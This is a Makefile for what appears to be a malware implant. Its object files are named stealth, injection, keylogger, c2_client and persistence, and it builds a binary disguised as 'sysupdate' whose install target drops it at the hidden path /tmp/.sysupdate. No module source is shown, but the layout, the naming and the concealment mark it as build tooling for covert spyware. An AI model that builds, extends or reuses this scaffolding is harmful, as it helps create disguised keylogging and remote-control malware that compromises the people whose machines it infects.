CC = gcc
CFLAGS = -Wall -O2 -fPIC -D_GNU_SOURCE
LDFLAGS = -lpthread -ldl -lssl -lcrypto

TARGET = sysupdate
OBJS = main.o stealth.o injection.o keylogger.o c2_client.o persistence.o

all: $(TARGET)

$(TARGET): $(OBJS)
	$(CC) -o $@ $^ $(LDFLAGS)

%.o: %.c
	$(CC) $(CFLAGS) -c $< -o $@

config_encrypt: config_encrypt.c
	$(CC) -o $@ $<

clean:
	rm -f $(OBJS) $(TARGET) config_encrypt config.enc config.txt

install: $(TARGET)
	cp $(TARGET) /tmp/.sysupdate
	chmod +x /tmp/.sysupdate

.PHONY: all clean install